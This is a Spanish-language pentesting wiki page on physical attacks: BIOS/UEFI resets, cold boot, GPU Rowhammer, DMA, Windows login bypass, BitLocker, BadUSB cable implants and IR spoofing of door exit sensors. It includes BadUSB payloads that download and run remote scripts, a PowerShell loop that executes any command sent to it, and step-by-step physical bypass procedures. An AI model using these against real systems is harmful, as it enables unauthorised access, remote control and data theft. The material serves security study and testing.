# Ataques físicos

{{#include ../banners/hacktricks-training.md}}

## Recuperación de contraseñas de BIOS y seguridad del sistema

**Restablecer la BIOS** se puede lograr de varias maneras. La mayoría de las placas base incluyen una **batería** que, al retirarla durante aproximadamente **30 minutos**, restablecerá la configuración de la BIOS, incluida la contraseña. Como alternativa, se puede ajustar un **jumper de la placa base** para restablecer esta configuración conectando pines específicos.

Cuando no es posible o práctico realizar ajustes de hardware, las **herramientas de software** ofrecen una solución. Ejecutar el sistema desde un **Live CD/USB** con distribuciones como **Kali Linux** proporciona acceso a herramientas como **_killCmos_** y **_CmosPWD_**, que pueden ayudar a recuperar la contraseña de la BIOS.

En los casos en los que se desconoce la contraseña de la BIOS, introducirla incorrectamente **tres veces** normalmente producirá un código de error. Este código se puede utilizar en sitios web como [https://bios-pw.org](https://bios-pw.org) para intentar obtener una contraseña funcional.

### Seguridad de UEFI

En los sistemas modernos que utilizan **UEFI** en lugar de la BIOS tradicional, se puede utilizar la herramienta **chipsec** para analizar y modificar la configuración de UEFI, incluida la desactivación de **Secure Boot**. Esto se puede lograr con el siguiente comando:
```bash
python chipsec_main.py -module exploits.secure.boot.pk
```
---

## Análisis de RAM y ataques Cold Boot

La RAM conserva los datos brevemente después de cortar la alimentación, normalmente durante **1 a 2 minutos**. Esta persistencia puede extenderse hasta **10 minutos** aplicando sustancias frías, como nitrógeno líquido. Durante este periodo ampliado, se puede crear un **memory dump** usando herramientas como **dd.exe** y **volatility** para su análisis.

---

## GPU Rowhammer contra tablas de páginas

Los ataques modernos de GPU Rowhammer resultan mucho más útiles cuando apuntan a los metadatos de la memoria virtual de la **GPU** en lugar de a buffers ordinarios. Trabajos recientes sobre **GDDR6 NVIDIA Ampere GPUs** muestran que un atacante que ejecute código CUDA sin privilegios puede crear patrones de hammering específicos para GPU, usar **memory massaging** para colocar estructuras de paginación en filas vulnerables y, posteriormente, cambiar bits en la **last-level page table** o en un **page directory** intermedio. Una vez que se corrompe una única entrada de traducción, el atacante puede obtener **arbitrary GPU memory read/write** y después pivotar hacia el compromiso del host.<sup>[[1]](#references)[[2]](#references)</sup>

### Patrón de explotación

1. **Perfilar filas susceptibles de hammering** en GDDR6 y crear patrones de hammering adaptados a las actualizaciones y no uniformes que eludan las mitigaciones integradas en la DRAM.
2. **Aplicar memory massaging a las asignaciones de la GPU** para que el driver coloque las estructuras de traducción de páginas en ubicaciones físicas susceptibles de hammering, en lugar de mantenerlas en el pool protegido predeterminado. En la práctica, esto puede implicar agotar la región de page tables de memoria baja y distribuir grandes asignaciones UVM dispersas con strides controlados.
3. **Cambiar los metadatos de traducción**, como **PFN** o bits relacionados con el aperture, dentro de una entrada de page table / page directory para que la página virtual controlada por el atacante resuelva a páginas de page tables, memoria arbitraria de la GPU o mappings del sistema visibles para el host.
4. Reutilizar el mapping falsificado para sobrescribir entradas de traducción adicionales y escalar hasta obtener **arbitrary GPU memory read/write** entre contextos de GPU.

### Pivot hacia el host y mitigaciones

- Con la **IOMMU deshabilitada**, los mappings falsificados del system aperture pueden exponer memoria física arbitraria del **host** a la GPU, convirtiendo la primitiva de la GPU en un compromiso completo del host.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** apunta a entradas de page tables del último nivel, mientras que **GeForge** muestra que corromper un nivel de page directory puede ser más sencillo, ya que un cambio de un bit puede redirigir un subárbol de traducción más grande. No se debe considerar que solo una capa de paginación sea crítica para la seguridad.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** sigue siendo importante porque bloquea la ruta directa hacia memoria arbitraria del host utilizada por GDDRHammer/GeForge, pero **no es una mitigación completa**. **GPUBreach** muestra un pivot de segunda fase en el que el atacante corrompe buffers de CPU propiedad del driver y escribibles por la GPU, y después activa bugs de memory-safety del driver de NVIDIA para obtener una primitiva de escritura en el kernel y un **root shell**, incluso con la IOMMU habilitada.<sup>[[3]](#references)</sup>
- La **ECC a nivel de sistema** es una medida práctica de hardening en GPUs de workstation/server compatibles. Las GPUs de consumo sin ECC presentan una superficie de defensa más débil.<sup>[[4]](#references)</sup>
- Estos ataques no son puramente teóricos: **GeForge** reportó **1,171** cambios de bit en una RTX 3060 y **202** en una RTX A6000, lo que bastó para crear una cadena funcional de escalada de privilegios en el host.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Ataques de acceso directo a memoria (DMA)

**INCEPTION** es una herramienta diseñada para la **manipulación de memoria física** mediante DMA, compatible con interfaces como **FireWire** y **Thunderbolt**. Permite eludir los procedimientos de inicio de sesión modificando la memoria para aceptar cualquier contraseña. Sin embargo, no es eficaz contra sistemas **Windows 10**.

---

## Live CD/USB para acceder al sistema

Cambiar binarios del sistema como **_sethc.exe_** o **_Utilman.exe_** por una copia de **_cmd.exe_** puede proporcionar un símbolo del sistema con privilegios de sistema. Se pueden utilizar herramientas como **chntpw** para editar el archivo **SAM** de una instalación de Windows, lo que permite cambiar contraseñas.

**Kon-Boot** es una herramienta que facilita iniciar sesión en sistemas Windows sin conocer la contraseña, modificando temporalmente el kernel de Windows o la UEFI. Se puede encontrar más información en [https://www.raymond.cc](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password/).<sup>[[10]](#references)</sup>

---

## Gestión de las funciones de seguridad de Windows

### Atajos de arranque y recuperación

- **Supr**: Acceder a la configuración de la BIOS.
- **F8**: Entrar en el modo de recuperación.
- Pulsar **Shift** después del banner de Windows puede eludir el autologon.

### Dispositivos BAD USB

Dispositivos como **Rubber Ducky** y **Teensyduino** sirven como plataformas para crear dispositivos **bad USB**, capaces de ejecutar payloads predefinidos al conectarse a un ordenador objetivo.

### Volume Shadow Copy

Los privilegios de administrador permiten crear copias de archivos sensibles, incluido el archivo **SAM**, mediante PowerShell.

## Técnicas de implantes BadUSB / HID

### Implantes de cables gestionados por Wi-Fi

- Los implantes basados en ESP32-S3, como **Evil Crow Cable Wind**, se ocultan dentro de cables USB-A→USB-C o USB-C↔USB-C, se enumeran únicamente como un teclado USB y exponen su stack de C2 mediante Wi-Fi. El operador solo necesita alimentar el cable desde el host de la víctima, crear un hotspot llamado `Evil Crow Cable Wind` con la contraseña `123456789` y acceder a [http://cable-wind.local/](http://cable-wind.local/) (o a su dirección DHCP) para llegar a la interfaz HTTP integrada.<sup>[[8]](#references)</sup>
- La interfaz del navegador proporciona pestañas para *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* y *Config*. Los payloads almacenados se etiquetan por sistema operativo, las distribuciones de teclado se cambian dinámicamente y las cadenas VID/PID pueden modificarse para imitar periféricos conocidos.
- Como el C2 reside dentro del cable, un teléfono puede preparar payloads, activar su ejecución y gestionar las credenciales Wi-Fi sin interactuar con el sistema operativo del host, lo que resulta ideal para intrusiones físicas de corta permanencia.

### Payloads AutoExec adaptados al sistema operativo

- Las reglas AutoExec vinculan uno o más payloads para que se ejecuten inmediatamente después de la enumeración USB. El implante realiza una identificación ligera del sistema operativo y selecciona el script correspondiente.
- Flujo de trabajo de ejemplo:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) o `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Como la ejecución no requiere supervisión, simplemente sustituir un cable de carga puede conseguir un acceso inicial de “plug-and-pwn” en el contexto del usuario que ha iniciado sesión.

### Remote shell mediante Wi-Fi TCP iniciada por HID

1. **Arranque mediante pulsaciones:** Un payload almacenado abre una consola y pega un bucle que ejecuta todo lo que llegue en el nuevo dispositivo serie USB. Una variante mínima para Windows es:
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Puente de cable:** El implante mantiene abierto el canal USB CDC mientras su ESP32-S3 inicia un cliente TCP (script de Python, APK de Android o ejecutable de escritorio) de vuelta al operador. Cualquier byte escrito en la sesión TCP se reenvía al bucle serie anterior, lo que proporciona ejecución remota de comandos incluso en hosts aislados. La salida es limitada, por lo que los operadores normalmente ejecutan comandos a ciegas (creación de cuentas, preparación de herramientas adicionales, etc.).

### Superficie de actualización HTTP OTA

- El mismo stack web suele exponer actualizaciones de firmware sin autenticación. Evil Crow Cable Wind escucha en `/update` y graba cualquier binario cargado:
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Los operadores de campo pueden cambiar funciones en caliente (por ejemplo, instalar el firmware de flash USB Army Knife) durante el engagement sin abrir el cable, lo que permite que el implant cambie a nuevas capacidades mientras sigue conectado al host objetivo.

## Bypassing BitLocker Encryption

El cifrado de BitLocker puede evadirse potencialmente si la **contraseña de recuperación** se encuentra dentro de un archivo de volcado de memoria (**MEMORY.DMP**). Para ello se pueden utilizar herramientas como **Elcomsoft Forensic Disk Decryptor** o **Passware Kit Forensic**.

---

## Social Engineering for Recovery Key Addition

Se puede añadir una nueva clave de recuperación de BitLocker mediante técnicas de ingeniería social, convenciendo a un usuario para que ejecute un comando que añade una nueva clave de recuperación compuesta por ceros, simplificando así el proceso de descifrado.

---

## Exploiting Chassis Intrusion / Maintenance Switches to Factory-Reset the BIOS

Muchos portátiles modernos y equipos de escritorio de formato reducido incluyen un **switch de intrusión del chasis** supervisado por el Embedded Controller (EC) y el firmware del BIOS/UEFI. Aunque el propósito principal del switch es generar una alerta cuando se abre un dispositivo, algunos fabricantes implementan ocasionalmente un **atajo de recuperación no documentado** que se activa cuando el switch se alterna siguiendo un patrón específico.<sup>[[5]](#references)[[6]](#references)</sup>

### How the Attack Works

1. El switch está conectado a una **interrupción GPIO** del EC.
2. El firmware que se ejecuta en el EC realiza un seguimiento del **tiempo y del número de pulsaciones**.
3. Cuando se reconoce un patrón codificado, el EC invoca una rutina de *mainboard-reset* que **borra el contenido de la NVRAM/CMOS del sistema**.
4. En el siguiente arranque, el BIOS carga los valores predeterminados: se borran la **contraseña de supervisor**, las claves de Secure Boot y toda la configuración personalizada.

> Una vez deshabilitado Secure Boot y eliminada la contraseña del firmware, el atacante puede simplemente arrancar cualquier imagen de un sistema operativo externo y obtener acceso sin restricciones a las unidades internas.

### Real-World Example – Framework 13 Laptop

El atajo de recuperación para el Framework 13 (de 11.ª/12.ª/13.ª generación) es:
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
Después del décimo ciclo, el EC establece una flag que indica al BIOS que borre la NVRAM en el siguiente reinicio. Todo el procedimiento tarda ~40 s y requiere **nada más que un destornillador**.<sup>[[5]](#references)</sup>

### Procedimiento de explotación genérico

1. Enciende o suspende y reanuda el objetivo para que el EC esté funcionando.
2. Retira la cubierta inferior para dejar expuesto el interruptor de intrusión/mantenimiento.
3. Reproduce el patrón de alternancia específico del proveedor (consulta la documentación y los foros, o realiza reverse engineering del firmware del EC).
4. Vuelve a montar el dispositivo y reinícialo; las protecciones del firmware deberían estar deshabilitadas.
5. Arranca desde un USB live (por ejemplo, Kali Linux) y realiza el post-exploitation habitual (volcado de credenciales, exfiltración de datos, implantación de binarios EFI maliciosos, etc.).

### Detección y mitigación

* Registra los eventos de intrusión del chasis en la consola de gestión del sistema operativo y correlaciónalos con reinicios inesperados del BIOS.
* Utiliza **sellos de evidencia de manipulación** en tornillos y cubiertas para detectar aperturas.
* Mantén los dispositivos en áreas **físicamente controladas**; asume que el acceso físico equivale a un compromiso total.
* Cuando esté disponible, deshabilita la función del proveedor de “restablecimiento mediante interruptor de mantenimiento” o exige una autorización criptográfica adicional para los restablecimientos de la NVRAM.

---

## Inyección IR encubierta contra sensores de salida sin contacto

### Características del sensor
- Los sensores comerciales de “salida mediante movimiento de la mano” combinan un emisor LED de near-IR con un módulo receptor similar al de un mando a distancia de TV, que solo informa un nivel lógico alto después de detectar varios pulsos (~4–10) de la portadora correcta (≈30 kHz).<sup>[[7]](#references)</sup>
- Una carcasa de plástico impide que el emisor y el receptor se vean directamente, por lo que el controlador asume que cualquier portadora validada procede de un reflejo cercano y activa un relé que abre el mecanismo de cierre de la puerta.
- Una vez que el controlador cree que hay un objetivo presente, suele cambiar la envolvente de modulación saliente, pero el receptor sigue aceptando cualquier ráfaga que coincida con la portadora filtrada.

### Flujo de ataque
1. **Captura el perfil de emisión**: conecta un analizador lógico entre los pines del controlador para registrar las formas de onda anteriores y posteriores a la detección que controlan el LED IR interno.
2. **Reproduce únicamente la forma de onda “posterior a la detección”**: retira o ignora el emisor original y controla un LED IR externo con el patrón que ya ha activado el sistema desde el inicio. Como al receptor solo le importan el número de pulsos y la frecuencia, trata la portadora falsificada como un reflejo genuino y activa la línea del relé.
3. **Regula la transmisión**: transmite la portadora en ráfagas ajustadas (por ejemplo, decenas de milisegundos encendida y un intervalo similar apagada) para proporcionar el número mínimo de pulsos sin saturar el AGC del receptor ni su lógica de gestión de interferencias. La emisión continua desensibiliza rápidamente el sensor e impide que el relé se active.

### Inyección reflectiva de largo alcance
- Sustituir el LED de pruebas por un diodo IR de alta potencia, un driver MOSFET y óptica de enfoque permite activarlo de forma fiable desde ~6 m de distancia.
- El atacante no necesita línea de visión directa con la apertura del receptor; apuntar el haz hacia paredes interiores, estanterías o marcos de puertas visibles a través del cristal permite que la energía reflejada entre en el campo de visión de ~30° y simule un movimiento de mano a corta distancia.
- Como los receptores esperan únicamente reflejos débiles, un haz externo mucho más potente puede rebotar en varias superficies y seguir por encima del umbral de detección.

### Linterna de ataque weaponised
- Integrar el driver dentro de una linterna comercial oculta la herramienta a plena vista. Sustituye el LED visible por un LED IR de alta potencia adaptado a la banda del receptor, añade un ATtiny412 (o similar) para generar las ráfagas de ≈30 kHz y utiliza un MOSFET para absorber la corriente del LED.
- Una lente telescópica de zoom concentra el haz para mejorar el alcance y la precisión, mientras que un motor de vibración controlado por el MCU proporciona confirmación háptica de que la modulación está activa sin emitir luz visible.
- Alternar entre varios patrones de modulación almacenados (con frecuencias de portadora y envolventes ligeramente distintas) aumenta la compatibilidad entre familias de sensores reetiquetados, lo que permite al operador recorrer superficies reflectantes hasta que el relé haga clic de forma audible y la puerta se abra.

---

## Referencias

- [1] [GDDRHammer: Greatly Disturbing DRAM Rows — Cross-Component Rowhammer Attacks from Modern GPUs](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: Hammering GDDR Memory to Forge GPU Page Tables for Fun and Profit](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Privilege Escalation Attacks on GPUs using Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Security Notice: Rowhammer - July 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Plug, Play, Pwn: Hacking with Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Rowhammer Attack Against NVIDIA Chips](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [raymond.cc - Login To Windows Administrator And Linux Root Account Without Knowing Or Changing Current Password](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password)

{{#include ../banners/hacktricks-training.md}}
